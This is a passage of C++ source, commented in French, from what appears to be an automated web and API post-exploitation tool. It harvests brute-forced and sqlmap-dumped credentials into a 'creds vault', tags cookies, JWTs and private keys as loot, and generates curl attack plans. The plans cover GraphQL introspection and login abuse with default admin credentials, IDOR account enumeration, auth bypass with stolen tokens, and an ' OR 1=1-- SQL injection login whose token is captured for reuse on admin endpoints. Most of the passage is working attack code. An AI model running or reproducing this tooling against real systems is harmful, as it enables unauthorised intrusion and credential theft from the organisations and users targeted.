                while (!target_url.empty() && (target_url.back()=='"' || std::isspace((unsigned char)target_url.back())))
                    target_url.pop_back();
            }
        }

        if (it != by_name.end() && fs::exists(it->second)) {
            try {
                std::string txt = readFile(it->second.string());

                // # SUCCESS: true/false
                {
                    std::istringstream iss(txt);
                    std::string line;
                    while (std::getline(iss, line)) {
                        if (line.find("# SUCCESS") != std::string::npos) {
                            if (icontains(line, "true")) success = true;
                        }
                        // Curl fallback: "FOUND username=... password=..."
                        if (line.find("FOUND username=") != std::string::npos && line.find(" password=") != std::string::npos) {
                            auto upos = line.find("username=");
                            auto ppos = line.find("password=");
                            if (upos != std::string::npos) {
                                size_t uend = line.find(' ', upos);
                                found_user = line.substr(upos + 9, (uend==std::string::npos? line.size():uend) - (upos + 9));
                            }
                            if (ppos != std::string::npos) {
                                size_t pend = line.size();
                                found_pass = line.substr(ppos + 9, pend - (ppos + 9));
                            }
                        }
                    }
                }

                // Hydra parsing succès:
                // exemples:
                // [80][http-post-form] host:80/path: login 'admin' password 'admin'
                // [443][http-get] host:443/: login 'user' password 'Winter2025'
                if (!success) {
                    static const std::regex hx(R"(\b(login|username)\s*'([^']+)'\s*password\s*'([^']+)')");
                    std::smatch m;
                    if (std::regex_search(txt, m, hx)) {
                        success = true;
                        if (found_user.empty()) found_user = m[2].str();
                        if (found_pass.empty()) found_pass = m[3].str();
                    }
                }

                // SQLMap hints: "password hashes", "current user", etc. (marque loot)
                std::string l = to_lower_copy(txt);
                if (l.find("password hash") != std::string::npos ||
                    l.find("current user")  != std::string::npos ||
                    l.find("database:")     != std::string::npos) {
                    has_loot = true;
                }
                // Tentative d'extraction simple de creds DB depuis la sortie sqlmap
                // Ex: "database management system users [1]:\n[*] 'root'@'localhost'\n[...]\n"
                {
                    static const std::regex dbu(R"((user|username)\s*[:=]\s*['"]?([a-zA-Z0-9._-]+)['"]?)");
                    static const std::regex dbp(R"((pass|password)\s*[:=]\s*['"]?([^'"\s]+)['"]?)");
                    std::smatch m1, m2;
                    if (std::regex_search(txt, m1, dbu) && std::regex_search(txt, m2, dbp)) {
                        std::string dbu_ = m1[2].str();
                        std::string dbp_ = m2[2].str();
                        if (!dbu_.empty() && !dbp_.empty()) {
                            std::string host = extract_hostname(target_url);
                            vault_add_credential(vault, host, "db", target_url, dbu_, dbp_, "sqlmap-dump");
                            has_loot = true;
                        }
                    }
                }


                // Cookies / tokens / keys dans la sortie -> loot
                if (l.find("set-cookie:") != std::string::npos ||
                    l.find("jwt")         != std::string::npos ||
                    l.find("private key") != std::string::npos ||
                    l.find("begin rsa private") != std::string::npos) {
                    has_loot = true;
                }

            } catch (...) {
                logerr("[AI] Post-exploit Web: echec lecture " + it->second.string());
            }
        }

        // Si des creds valides ont été trouvés, on les push dans le vault
        if (success && (!found_user.empty() && !found_pass.empty())) {
            // Endpoint: si on a mieux, tu peux reconstruire depuis cmd.command ou ev["target"] dans le plan_json (optionnel).
            std::string host = extract_hostname(target_url);
            vault_add_credential(vault, host, "web", target_url, found_user, found_pass,
                                 icontains(cmd.id,"HYDRA")? "hydra" : "curl-brute");
        }

        jf["success"]  = success;
        jf["has_loot"] = has_loot;
        if (!found_user.empty()) jf["username"] = found_user;
        if (!found_pass.empty()) jf["password"] = found_pass;

        results["flows"].push_back(jf);
    }

    // Sauvegarde le vault si enrichi
    try { save_creds_vault(workdir, vault); } catch (...) {}

    fs::path outfile = workdir / "postexploit_results_web.json";
    try {
        std::ofstream out(outfile);
        out << results.dump(2);
        loginfo("[AI] Post-exploit Web: resume symbolique ecrit dans " + outfile.string());
    } catch (...) {
        logerr("[AI] Post-exploit Web: echec ecriture postexploit_results_web.json");
    }
}
// ============================================================================
// [PATCH API]  Orchestrateur Post-Exploit API : REST / GraphQL / gRPC / Gateways
// ============================================================================
// - Parse recon_* (katana, waybackurls, dirb, httpx, whatweb, naabu)
// - Génère les flows :
//     * FLOW_API_ENUM (OpenAPI/Swagger, GraphQL introspection, gRPC reflection)
//     * FLOW_API_AUTH_BYPASS (no auth / tokens vault)
//     * FLOW_API_GRAPHQL_ABUSE (mass queries / DoS / enumeration)
//     * FLOW_API_GATEWAY_POLICY_ABUSE (Kong/Tyk/Apigee admin / policies)
// - Consolide :
//     * api_catalog.json
//     * api_catalog_prioritized.json (priorisation symbolique locale)
//     * api_auth_findings.json (+ ingestion automatique des tokens vers creds_vault.json)
//     * graphql_loot.json
//     * api_gateway_takeover.json
// ============================================================================

// ---------- helpers locaux (légers) ----------
static inline bool starts_with(const std::string& s, const std::string& p) {
    return s.rfind(p, 0) == 0;
}
static inline bool ends_with(const std::string& s, const std::string& suf) {
    return s.size() >= suf.size() &&
           s.compare(s.size() - suf.size(), suf.size(), suf) == 0;
}

static inline std::string url_root(const std::string& u) {
    // "https://host:port/path" -> "https://host:port"
    auto p = u.find("://");
    if (p == std::string::npos) return u;
    p += 3;
    auto s = u.find('/', p);
    return s == std::string::npos ? u : u.substr(0, s);
}

static inline std::string join_url(const std::string& root, const std::string& path) {
    if (ends_with(root, "/") && starts_with(path, "/"))
        return root + path.substr(1);
    if (!ends_with(root, "/") && !starts_with(path, "/"))
        return root + "/" + path;
    return root + path;
}

// Lit un fichier si présent (sinon string vide)
static std::string slurp_if_exists(const fs::path& p) {
    if (!fs::exists(p)) return {};
    try {
        return readFile(p.string());
    } catch (...) {
        return {};
    }
}

static void harvest_api_from_urls_file(
    const std::filesystem::path& f,
    std::vector<std::string>& rest_full,
    std::set<std::string>&      rest_bases,
    std::set<std::string>&      openapi_paths,
    std::set<std::string>&      graphql_eps)
{
    namespace fs = std::filesystem;
    if (!fs::exists(f)) return;

    std::ifstream in(f);
    std::string line;

    static const char* KEYS[] = {
        "login","signin","sign-in","logon","authenticate","auth",
        "register","signup","sign-up","forgot","reset","password",
        "logout","twofactor","mfa","callback","redirect","session","token",
        "admin","administrator","backoffice","dashboard","account","profile","settings","config","debug",
        "upload","import","file","backup","restore","export","download","attachment",
        "search","query","filter","report","analytics",
        "swagger","openapi","api-docs","v3/api-docs","swagger-ui","swagger.json",
        "graphql","graphiql","playground","gql",
        ".php",".asp",".aspx",".jsp",".do"
    };

    auto to_lower = [](std::string s){ std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c){return std::tolower(c);}); return s; };

    while (std::getline(in, line)) {
        std::string u = trim_copy(extract_url_from_line(line).empty() ? line : extract_url_from_line(line));
        if (u.empty() || u.rfind("http", 0) != 0) continue;

        std::string low = to_lower(u);

        // collect GraphQL/OpenAPI
        if (low.find("/graphql")!=std::string::npos || low.find("/gql")!=std::string::npos ||
            low.find("/graphiql")!=std::string::npos || low.find("/playground")!=std::string::npos) {
            graphql_eps.insert(u);
        }
        if (low.find("/swagger")!=std::string::npos || low.find("/openapi")!=std::string::npos ||
            low.find("/v3/api-docs")!=std::string::npos || low.find("/api-docs")!=std::string::npos ||
            low.find("/swagger-ui")!=std::string::npos || low.find("/swagger.json")!=std::string::npos) {
            openapi_paths.insert(u);
        }

        bool looks_rest = (low.find("/api")!=std::string::npos) || (low.find("/v1/")!=std::string::npos);
        bool interesting=false; for (auto*k:KEYS) { if (low.find(k)!=std::string::npos){ interesting=true; break; } }

        if (looks_rest || interesting) {
            rest_full.push_back(u);

            auto root = url_root(u);
            std::string base = root;
            if (low.find("/api")!=std::string::npos) base = join_url(root, "/api");
            else if (low.find("/v1/")!=std::string::npos) base = join_url(root, "/v1");
            rest_bases.insert(base);
        }
    }
}


// Détection Gateways et HTTP/2/gRPC : httpx + whatweb
static void detect_gateways_and_h2(const fs::path& workdir,
                                   const std::string& baseurl,
                                   std::set<std::string>& gateways, // "kong","tyk","apigee"
                                   bool& has_h2,
                                   std::vector<std::string>& webrtc_signaling)
{
    std::string httpx = slurp_if_exists(workdir / "recon_httpx.txt");
    std::string wwv   = slurp_if_exists(workdir / "recon_whatweb_verbose.log");
    std::string both  = to_lower_copy(httpx + "\n" + wwv);

    has_h2 = (both.find(" h2")   != std::string::npos) ||
             (both.find("http2") != std::string::npos);

    if (both.find("kong")  != std::string::npos ||
        both.find("x-kong")!= std::string::npos)
        gateways.insert("kong");
    if (both.find("tyk")   != std::string::npos)
        gateways.insert("tyk");
    if (both.find("apigee")!= std::string::npos)
        gateways.insert("apigee");

    // WebRTC signaling via APIs (SIP/HTTP)
    if (both.find("webrtc") != std::string::npos ||
        both.find("sip")    != std::string::npos) {
        std::string root = url_root(baseurl);
        webrtc_signaling.push_back(join_url(root, "/rtc"));
        webrtc_signaling.push_back(join_url(root, "/webrtc"));
        webrtc_signaling.push_back(join_url(root, "/api/sip"));
    }
}

// Harvest des triggers API depuis les artefacts recon_*
static nlohmann::json harvest_api_triggers(const std::string& baseurl,
                                           const fs::path& workdir)
{
    using json = nlohmann::json;

    std::vector<std::string> rest_full;
    std::set<std::string>    rest_bases;
    std::set<std::string>    openapi_paths;
    std::set<std::string>    graphql_eps;
    bool                     has_h2 = false;
    std::set<std::string>    gateways;
    std::vector<std::string> webrtc_signaling;

    // Récolte depuis Katana/Wayback/Dirb (filtrage élargi via la fonction ci-dessus)
    harvest_api_from_urls_file(workdir / "recon_katana_urls_ok.txt",
                               rest_full, rest_bases, openapi_paths, graphql_eps);
    harvest_api_from_urls_file(workdir / "recon_waybackurls.txt",
                               rest_full, rest_bases, openapi_paths, graphql_eps);
    harvest_api_from_urls_file(workdir / "recon_dirb_common.txt",
                               rest_full, rest_bases, openapi_paths, graphql_eps);

    // Détection gateways & HTTP/2 (existant)
    detect_gateways_and_h2(workdir, baseurl, gateways, has_h2, webrtc_signaling);

    // === PROBE GraphQL actifs sur suffixes standards ===
    // === PROBE GraphQL actifs sur suffixes standards (liste élargie) ===
    {
        std::string root = url_root(baseurl);

        static const char* GQL_SUFFIXES[] = {
            "/graphql",
            "/api/graphql",
            "/v1/graphql",
            "/v2/graphql",
            "/v3/graphql",
            "/graphql/v1",
            "/graphql/v2",
            "/graphql/v3",
            "/gql",
            "/api/gql",
            "/v1/gql",
            "/v2/gql",
            "/graphiql",
            "/playground",
            "/graphql/playground",
            "/altair",
            "/graphql/altair",
            "/voyager",
            "/graphql/voyager",
            "/graph",
            "/api/graph",
            "/query",
            "/graphql/query",
            "/api/graphql/query",
            "/graphql/console",
            "/graphql/api",
            "/api/v1/graphql",
            "/api/v2/graphql",
            "/api/v3/graphql",
            "/api/graphql/v1",
            "/api/graphql/v2",
            "/api/graphql/v3",
            "/_graphql",
            "/graphql/",
            "/api/graphql/",
            "/v1/graphql/",
            "/v2/graphql/",
            "/v3/graphql/",
            "/graphql/v1/",
            "/graphql/v2/",
            "/graphql/v3/",
            "/gql/",
            "/api/gql/",
            "/graphiql/",
            "/playground/",
            "/graphql/playground/",
            "/altair/",
            "/graphql/altair/",
            "/voyager/",
            "/graphql/voyager/",
            "/graph/",
            "/api/graph/",
            "/query/",
            "/graphql/query/",
            "/graphql/schema",
            "/graphql/introspect",
            "/graphql/introspection",
            "/graphql-explorer",
            "/explore/graphql",
            "/explorer/graphql"
        };

        for (auto* suf : GQL_SUFFIXES) {
            std::string u = join_url(root, suf);

            nlohmann::json probe = {
                {"query", "{ __typename }"}
            };

            std::string data = probe.dump();

            std::ostringstream cmd;
            cmd << "curl -sk -X POST "
                << "-H 'Content-Type: application/json' "
                << "-d " << shell_escape_double_quotes(data) << " "
                << shell_escape_double_quotes(u);

            std::string out, err;
            bool ok = run_command_capture(cmd.str(), out, err, 5000, false);

            if (!ok || out.empty()) continue;

            if (out.find("\"data\"") != std::string::npos ||
                out.find("\"errors\"") != std::string::npos)
            {
                graphql_eps.insert(u);
            }
        }
    }


    // Ports gRPC classiques si Naabu a tourné (best-effort) — code existant conservé
    std::vector<uint16_t> grpc_ports;
    {
        fs::path naabu_all = workdir / "recon_naabu_all.txt";
        if (fs::exists(naabu_all)) {
            std::ifstream in(naabu_all);
            std::string line;
            while (std::getline(in, line)) {
                auto t = trim_copy(line);
                if (t == "80"  || t == "81"  || t == "88" ||
                    t == "443" || t == "8443" || t == "50051" ||
                    t == "50052" || t == "8080" || t == "18080") {
                    try {
                        uint16_t p = (uint16_t)std::stoul(t);
                        if (std::find(grpc_ports.begin(), grpc_ports.end(), p) == grpc_ports.end())
                            grpc_ports.push_back(p);
                    } catch(...) {}
                }
            }
        }
        if (grpc_ports.empty() && has_h2) {
            // HTTP/2 only : tenter 443 en gRPC plaintext pour reflection (best-effort)
            grpc_ports.push_back(443);
        }
    }

    // Serialization du "trig" (consommé partout ensuite, y compris append_api_enum_cmds)
    json j;
    j["rest_bases"]         = json::array();
    for (auto& b : rest_bases) j["rest_bases"].push_back(b);

    j["rest_endpoints"]     = rest_full;

    j["openapi_candidates"] = json::array();
    for (auto& p : openapi_paths) j["openapi_candidates"].push_back(p);

    j["graphql_endpoints"]  = json::array();
    for (auto& g : graphql_eps) j["graphql_endpoints"].push_back(g);

    j["grpc_ports"]         = grpc_ports;

    j["gateways"]           = json::array();
    for (auto& g : gateways) j["gateways"].push_back(g);

    j["webrtc_signaling"]   = webrtc_signaling;

    return j;
}

// Ajoute un flow au plan (compatible avec le struct ConfirmationCommand existant)
static void add_api_flow(std::vector<ConfirmationCommand>& plan,
                         nlohmann::json& plan_json,
                         const std::string& id,
                         const std::string& category,
                         const std::string& target,
                         const std::string& desc,
                         const std::string& cmd,
                         const fs::path& outfile,
                         const nlohmann::json& evidence = {})
{
    // 1) Ajout dans le plan d'exécution
    ConfirmationCommand c;
    c.id          = id;
    c.description = desc;
    c.command     = cmd;
    c.outfile     = outfile;
    add_unique_cmd(plan, c);  // ⚠️ on déduplique comme ailleurs

    // 2) Trace enrichie dans le JSON du plan (métadonnées hors struct)
    nlohmann::json meta = evidence;
    meta["target"]   = target;
    meta["category"] = category;

    plan_json["flows"].push_back({
        {"id",        id},
        {"description", desc},
        {"command",     cmd},
        {"outfile",     outfile.string()},
        {"meta",        meta}
    });
}

// Auth bypass / BOLA / IDOR
static void append_api_auth_bypass_cmds(const fs::path& workdir,
                                        const nlohmann::json& trig,
                                        std::vector<ConfirmationCommand>& plan,
                                        nlohmann::json& plan_json)
{
    using nlohmann::json;

    // Sous-ensemble d’URLs REST (limite 30) pour tests with/without token
    std::vector<std::string> eps =
        trig.value("rest_endpoints", std::vector<std::string>{});
    if (eps.size() > 30) eps.resize(30);

    // Récup tokens du vault si déjà présents (username marqueur __token__*)
    nlohmann::json vault = load_creds_vault(workdir);
    std::vector<std::string> tokens;

    if (vault.is_array()) {
        for (auto& c : vault) {
            std::string u = c.value("username", "");
            std::string p = c.value("password", "");
            if (!p.empty() &&
                (starts_with(u, "__token__") ||
                 icontains(u, "bearer") ||
                 icontains(c.value("service", ""), "token"))) {
                tokens.push_back(p);
            }
        }
    }
    if (tokens.size() > 3) tokens.resize(3);

    int i = 0;
    for (auto& u : eps) {
        std::string safe = shell_escape_double_quotes(u);

        // Sans auth
        {
            fs::path out = workdir / ("api_auth_bypass_" +
                                      std::to_string(i) + "_noauth.txt");
            std::string cmd = "curl -sk -D - \"" + safe + "\"";
            add_api_flow(plan, plan_json,
                         "FLOW_API_AUTH_BYPASS_NOAUTH_" + std::to_string(i),
                         "API_AUTH_BYPASS", u,
                         "API AuthBypass: requête sans Authorization sur " + u,
                         cmd, out);
        }

        // Avec tokens (si dispo)
        for (std::size_t k = 0; k < tokens.size(); ++k) {
            std::string tok  = shell_escape_double_quotes(tokens[k]);
            fs::path out     = workdir / ("api_auth_bypass_" +
                                          std::to_string(i) +
                                          "_tok" + std::to_string(k) + ".txt");
            std::string cmd  =
                "curl -sk -D - \"" + safe +
                "\" -H \"Authorization: Bearer " + tok + "\"";
            add_api_flow(plan, plan_json,
                         "FLOW_API_AUTH_BYPASS_TOKEN_" +
                         std::to_string(i) + "_" + std::to_string(k),
                         "API_AUTH_BYPASS", u,
                         "API AuthBypass: test avec token vault sur " + u,
                         cmd, out, {{"token_index",
                                     static_cast<int>(k)}});
        }

        ++i;
    }
}

static void append_api_graphql_abuse_cmds(
    const nlohmann::json& trig,
    const std::string& baseurl,
    const std::filesystem::path& workdir,
    std::vector<ConfirmationCommand>& plan,
    bool intrusive)
{
    using std::string;
    using nlohmann::json;
    namespace fs = std::filesystem;

    fs::path outdir = workdir / "api_graphql";
    try { fs::create_directories(outdir); } catch (...) {}

    auto mk_cmd = [&](const string& id,
                      const string& desc,
                      const string& shell_cmd,
                      const fs::path& outfile)
    {
        ConfirmationCommand c;
        c.id          = id;
        c.description = desc;
        c.command     = shell_cmd;
        c.outfile     = outfile;
        plan.push_back(std::move(c));
    };

    // --------------------------------------------------------------------
    // 1) Endpoints GraphQL (harvest + heuristique)
    // --------------------------------------------------------------------
    std::vector<string> eps;

    if (trig.contains("graphql_endpoints") && trig["graphql_endpoints"].is_array()) {
        for (const auto& v : trig["graphql_endpoints"]) {
            if (v.is_string()) eps.push_back(v.get<string>());
        }
    } else if (trig.contains("graphql") && trig["graphql"].is_object()) {
        const auto& gql = trig["graphql"];
        if (gql.contains("endpoints") && gql["endpoints"].is_array()) {
            for (const auto& v : gql["endpoints"]) {
                if (v.is_string()) eps.push_back(v.get<string>());
            }
        }
    }

    if (eps.empty()) {
        eps.push_back(url_root(baseurl) + "/graphql");
        eps.push_back(baseurl + "/graphql");
    }

    std::sort(eps.begin(), eps.end());
    eps.erase(std::unique(eps.begin(), eps.end()), eps.end());

    int counter = 11000;

    for (const auto& ep_raw : eps) {
        string ep = shell_escape_double_quotes(ep_raw);

        // ----------------------------------------------------------------
        // 2) Probe HTTP (code)
        // ----------------------------------------------------------------
        {
            fs::path out = outdir / ("probe_" + std::to_string(counter) + ".txt");
            string cmd =
                "CODE=$(curl -sk -o /dev/null -w '%{http_code}' -X OPTIONS " + ep + "); "
                "if [ \"$CODE\" = \"000\" ]; then "
                "  CODE=$(curl -sk -o /dev/null -w '%{http_code}' " + ep + "); "
                "fi; "
                "printf '%s\\n' \"$CODE\" > " + shell_escape_double_quotes(out.string());

            mk_cmd("GQL_PROBE_" + std::to_string(counter),
                   "Probe GraphQL " + ep_raw,
                   cmd,
                   out);
        }

        // ----------------------------------------------------------------
        // 3) Introspection légère (__schema types/kind)
        // ----------------------------------------------------------------
        {
            fs::path out = outdir / ("introspection_" +
                                     std::to_string(counter) + ".json");

            json body;
            body["query"] =
                "query Introspect{__schema{types{name kind}}}";

            string payload = body.dump();

            string cmd =
                "curl -sk -X POST -H 'Content-Type: application/json' "
                "--data-binary " + shell_escape_double_quotes(payload) + " "
                + ep + " > " + shell_escape_double_quotes(out.string());

            mk_cmd("GQL_INTROSPECT_" + std::to_string(counter),
                   "Introspection GraphQL (types/kind) sur " + ep_raw,
                   cmd,
                   out);
        }

        // ----------------------------------------------------------------
        // 4) Introspection lourde (queries/mutations/fields)
        // ----------------------------------------------------------------
        if (intrusive) {
            fs::path out = outdir / ("enum_queries_" +
                                     std::to_string(counter) + ".json");

            json body;
            body["query"] =
                "{ __schema { queryType { name } mutationType { name } "
                "types { name kind fields { name } } } }";

            string payload = body.dump();

            string cmd =
                "curl -sk -X POST -H 'Content-Type: application/json' "
                "--data-binary " + shell_escape_double_quotes(payload) + " "
                + ep + " > " + shell_escape_double_quotes(out.string());

            mk_cmd("GQL_ENUM_FIELDS_" + std::to_string(counter),
                   "Enumération GraphQL (queries/mutations) sur " + ep_raw,
                   cmd,
                   out);
        }

        // ----------------------------------------------------------------
        // 5) ABUS GraphQL générique (login + enum comptes) si intrusive
        // ----------------------------------------------------------------
        if (intrusive) {
            // A) Mutations 'login-like'
            std::vector<string> op_names = {
                "login",
                "signin",
                "authenticate",
                "auth",
                "register",
                "signup"
            };

            struct LoginPattern {
                string arg1;
                string arg2;
                string val1;
                string val2;
                string outField;
            };

            std::vector<LoginPattern> patterns = {
                {"username", "password", "admin",        "admin",   "token"},
                {"email",    "password", "admin@local",  "admin",   "token"},
                {"user",     "pass",     "admin",        "admin",   "jwt"}
            };

            int lid = 0;
            for (const auto& opname : op_names) {
                for (const auto& pat : patterns) {
                    fs::path out = outdir / ("abuse_login_" +
                                             std::to_string(counter) +
                                             "_" + std::to_string(lid) + ".json");

                    std::ostringstream q;
                    q << "mutation { "
                      << opname
                      << "(" << pat.arg1 << ":\\\"" << pat.val1 << "\\\", "
                      << pat.arg2 << ":\\\"" << pat.val2 << "\\\") "
                      << "{ " << pat.outField << " } }";

                    json body;
                    body["query"] = q.str();

                    string payload = body.dump();

                    string cmd =
                        "curl -sk -X POST -H 'Content-Type: application/json' "
                        "--data-binary " + shell_escape_double_quotes(payload) +
                        " " + ep + " > " +
                        shell_escape_double_quotes(out.string());

                    mk_cmd("GQL_ABUSE_LOGIN_" + std::to_string(counter) +
                           "_" + std::to_string(lid),
                           "Abus login GraphQL générique op=" + opname,
                           cmd,
                           out);
                    ++lid;
                }
            }

            // B) IDOR / enum comptes
            std::vector<string> user_queries = {
                "{ users { id email role } }",
                "{ accounts { id email role } }",
                "{ me { id email role isAdmin } }",
                "{ currentUser { id email role isAdmin } }"
            };

            int qid = 0;
            for (const auto& qstr : user_queries) {
                fs::path out = outdir / ("abuse_idor_" +
                                         std::to_string(counter) +
                                         "_" + std::to_string(qid) + ".json");

                json body;
                body["query"] = qstr;
                string payload = body.dump();

                string cmd =
                    "curl -sk -X POST -H 'Content-Type: application/json' "
                    "--data-binary " + shell_escape_double_quotes(payload) +
                    " " + ep + " > " +
                    shell_escape_double_quotes(out.string());

                mk_cmd("GQL_ABUSE_IDOR_" + std::to_string(counter) +
                       "_" + std::to_string(qid),
                       "Abus IDOR/enum comptes GraphQL générique",
                       cmd,
                       out);
                ++qid;
            }
        }

        ++counter;
    }
}

static void append_api_enum_cmds(
    const nlohmann::json& trig,
    const std::string& baseurl,
    const std::filesystem::path& workdir,
    std::vector<ConfirmationCommand>& plan)
{
    using std::string;
    using nlohmann::json;
    namespace fs = std::filesystem;

    const fs::path outdir = workdir / "api_enum";
    try { fs::create_directories(outdir); } catch (...) {}

    auto mk_cmd = [&](int id,
                      const string& desc,
                      const string& shell_cmd,
                      const fs::path& outfile)
    {
        ConfirmationCommand c;
        c.id          = "FLOW_API_ENUM_" + std::to_string(id);
        c.description = desc;
        c.command     = shell_cmd;
        c.outfile     = outfile;
        plan.push_back(std::move(c));
    };

    // --------------------------------------------------------------------
    // 1) Construire la liste d’URLs candidates (REST + GraphQL + OpenAPI)
    // --------------------------------------------------------------------
    std::vector<string> candidates;

    // a) REST "simple"
    if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
        for (const auto& v : trig["rest_endpoints"]) {
            if (v.is_string()) {
                string u = v.get<string>();
                if (!u.empty()) candidates.push_back(u);
            }
        }
    }

    // b) REST enrichi (objets "rest")
    if (trig.contains("rest") && trig["rest"].is_array()) {
        for (const auto& jrest : trig["rest"]) {
            if (!jrest.is_object()) continue;

            if (jrest.contains("endpoints") && jrest["endpoints"].is_array()) {
                for (const auto& u : jrest["endpoints"]) {
                    if (u.is_string()) {
                        string s = u.get<string>();
                        if (!s.empty()) candidates.push_back(s);
                    }
                }
            }

            if (jrest.contains("openapi_specs") && jrest["openapi_specs"].is_array()) {
                for (const auto& sp : jrest["openapi_specs"]) {
                    if (sp.is_string()) {
                        string s = sp.get<string>();
                        if (!s.empty()) candidates.push_back(s);
                    }
                }
            }
        }
    }

    // c) GraphQL endpoints
    if (trig.contains("graphql") && trig["graphql"].is_object()) {
        const auto& gql = trig["graphql"];
        if (gql.contains("endpoints") && gql["endpoints"].is_array()) {
            for (const auto& v : gql["endpoints"]) {
                if (v.is_string()) {
                    string u = v.get<string>();
                    if (!u.empty()) candidates.push_back(u);
                }
            }
        }
    }

    // d) fallback générique
    if (candidates.empty()) {
        candidates.push_back(baseurl);
        candidates.push_back(baseurl + "/api");
        candidates.push_back(baseurl + "/rest");
        candidates.push_back(baseurl + "/graphql");
    }

    std::sort(candidates.begin(), candidates.end());
    candidates.erase(std::unique(candidates.begin(), candidates.end()),
                     candidates.end());
    if (candidates.size() > 200) candidates.resize(200);

    {
        fs::path out = outdir / "endpoints.txt";
        try {
            std::ofstream ofs(out);
            for (const auto& u : candidates) ofs << u << "\n";
        } catch (...) {}
    }

    // --------------------------------------------------------------------
    // 2) HTTPX + Nuclei (fingerprint / quick vulns)
    // --------------------------------------------------------------------
    {
        fs::path out = outdir / "httpx.txt";

        std::ostringstream oss_urls;
        for (const auto& u : candidates) {
            oss_urls << " " << shell_escape_double_quotes(u);
        }

        std::ostringstream oss;
        oss << "printf '%s\\n'"
            << oss_urls.str()
            << " | tr ' ' '\\n' | "
            << "httpx -silent -no-color -status-code -content-type -title -ip "
            << "-o " << shell_escape_double_quotes(out.string());

        mk_cmd(20000,
               "HTTPX fingerprint sur endpoints API",
               oss.str(),
               out);
    }

    {
        fs::path out = outdir / "nuclei.txt";

        std::ostringstream oss_urls;
        for (const auto& u : candidates) {
            oss_urls << " " << shell_escape_double_quotes(u);
        }

        std::ostringstream oss;
        oss << "if command -v nuclei >/dev/null 2>&1; then "
            << "printf '%s\\n'" << oss_urls.str()
            << " | tr ' ' '\\n' | "
            << "nuclei -silent -severity critical,high,medium,low "
            << "-o " << shell_escape_double_quotes(out.string())
            << " ; fi";

        mk_cmd(20001,
               "Nuclei sur endpoints API",
               oss.str(),
               out);
    }

    // --------------------------------------------------------------------
    // 3) Heuristiques REST (login, search, XSS, SSRF)
    // --------------------------------------------------------------------
    std::vector<string> rest_eps;
    if (trig.contains("rest_endpoints") && trig["rest_endpoints"].is_array()) {
        for (const auto& v : trig["rest_endpoints"]) {
            if (v.is_string()) rest_eps.push_back(v.get<string>());
        }
    }
    if (rest_eps.empty()) {
        // petits fallbacks génériques
        rest_eps.push_back(baseurl + "/login");
        rest_eps.push_back(baseurl + "/api/login");
        rest_eps.push_back(baseurl + "/api/auth/login");
        rest_eps.push_back(baseurl + "/api/search");
        rest_eps.push_back(baseurl + "/api/feedback");
    }

    auto to_lower_str = [](string s) {
        std::transform(s.begin(), s.end(), s.begin(),
                       [](unsigned char c){return std::tolower(c);});
        return s;
    };

    auto looks_login = [&](const string& u) -> bool {
        string l = to_lower_str(u);
        return l.find("login")   != string::npos ||
               l.find("signin")  != string::npos ||
               l.find("/auth")   != string::npos ||
               l.find("session") != string::npos ||
               l.find("token")   != string::npos;
    };

    auto looks_searchy = [&](const string& u) -> bool {
        string l = to_lower_str(u);
        if (u.find('?')             != string::npos) return true;
        if (l.find("search")        != string::npos) return true;
        if (l.find("query")         != string::npos) return true;
        if (l.find("filter")        != string::npos) return true;
        if (l.find("lookup")        != string::npos) return true;
        if (l.find("find")          != string::npos) return true;
        return false;
    };

    auto looks_xssy = [&](const string& u) -> bool {
        string l = to_lower_str(u);
        return l.find("feedback") != string::npos ||
               l.find("comment")  != string::npos ||
               l.find("review")   != string::npos ||
               l.find("message")  != string::npos ||
               l.find("post")     != string::npos;
    };

    auto looks_ssrfy = [&](const string& u) -> bool {
        string l = to_lower_str(u);
        if (l.find("url=")      != string::npos) return true;
        if (l.find("redirect")  != string::npos) return true;
        if (l.find("callback")  != string::npos) return true;
        if (l.find("target")    != string::npos) return true;
        if (l.find("endpoint")  != string::npos) return true;
        if (l.find("fetch")     != string::npos) return true;
        if (l.find("proxy")     != string::npos) return true;
        if (l.find("image")     != string::npos) return true;
        return false;
    };

    auto detect_param_name = [&](const string& u, const string& deflt) -> string {
        auto qpos = u.find('?');
        if (qpos == string::npos || qpos + 1 >= u.size()) return deflt;
        string qs = u.substr(qpos + 1);
        auto amp = qs.find('&');
        if (amp != string::npos) qs = qs.substr(0, amp);
        auto eq = qs.find('=');
        if (eq != string::npos) {
            string name = qs.substr(0, eq);
            if (!name.empty()) return name;
        }
        if (!qs.empty()) return qs;
        return deflt;
    };

    fs::path token_file = workdir / "bearer_token.txt";

    // ---------------------- 3.1 Login SQLi / bypass ----------------------
    {
        std::vector<string> login_eps;
        for (const auto& u : rest_eps) {
            if (looks_login(u)) login_eps.push_back(u);
        }
        if (login_eps.empty()) {
            for (const auto& u : rest_eps) {
                login_eps.push_back(u);
                if (login_eps.size() >= 3) break;
            }
        }

        int idx = 0;
        for (const auto& ep : login_eps) {
            ConfirmationCommand c;
            c.id          = "REST_LOGIN_SQLI_" + std::to_string(idx);
            c.description = "Tentative login SQLi / bypass générique sur " + ep;
            c.outfile     = outdir / ("login_" + std::to_string(idx) + ".json");

            json body = {
                {"username", "' OR 1=1--"},
                {"email",    "' OR 1=1--"},
                {"password", "x"}
            };

            std::ostringstream oss;
            oss << "("
                << "curl -sk -H \"Content-Type: application/json\" "
                << "--data-binary " << shell_escape_double_quotes(body.dump()) << " "
                << shell_escape_double_quotes(ep)
                << " || true"
                << ") | tee " << shell_escape_double_quotes(c.outfile.string())
                << " | jq -r '.token // .access_token // .id_token // .jwt "
                              "// .data.token // .data.access_token // empty' "
                              "2>/dev/null | head -n1 > "
                << shell_escape_double_quotes(token_file.string())
                << " ; if [ -s " << shell_escape_double_quotes(token_file.string())
                << " ]; then echo TOKEN_OK; else echo TOKEN_FAIL; fi";

            c.command = oss.str();
            plan.push_back(std::move(c));
            ++idx;
        }
    }

    // ---------------------- 3.2 Admin endpoints avec Bearer --------------
    {
        auto to_lower = to_lower_str;
        std::vector<string> admin_eps;
        for (const auto& u : rest_eps) {
            string l = to_lower(u);
            if (l.find("admin")      != string::npos ||
                l.find("backoffice") != string::npos ||
                l.find("management") != string::npos ||
                l.find("config")     != string::npos ||
                l.find("settings")   != string::npos) {
                admin_eps.push_back(u);
            }
        }

        int idx = 0;
        for (const auto& ep : admin_eps) {
            ConfirmationCommand c;
            c.id          = "REST_BEARER_ADMIN_" + std::to_string(idx);
            c.description = "Test Bearer token sur endpoint admin " + ep;
            c.outfile     = outdir / ("admin_bearer_" + std::to_string(idx) + ".txt");
